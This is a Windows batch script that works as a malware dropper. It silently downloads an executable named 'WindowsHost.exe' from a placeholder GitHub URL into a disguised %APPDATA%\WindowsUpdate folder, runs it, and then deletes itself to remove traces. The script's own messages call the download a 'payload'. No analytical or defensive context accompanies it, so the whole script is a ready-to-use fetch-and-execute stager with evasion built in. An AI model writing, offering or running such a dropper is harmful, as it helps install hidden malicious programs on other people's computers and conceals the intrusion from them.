@echo off
setlocal enableextensions

set "exeName=WindowsHost.exe"
set "webURL=https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/%exeName%"
set "destPath=%APPDATA%\WindowsUpdate"
set "fullDest=%destPath%\%exeName%"

if not exist "%destPath%" (
    mkdir "%destPath%"
)

if not exist "%fullDest%" (
    echo [+] Installing payload...
    curl -s -o "%fullDest%" "%webURL%"
)

start "" "%fullDest%"

echo [+] Cleaning up...
timeout /t 1 >nul
del "%~f0"
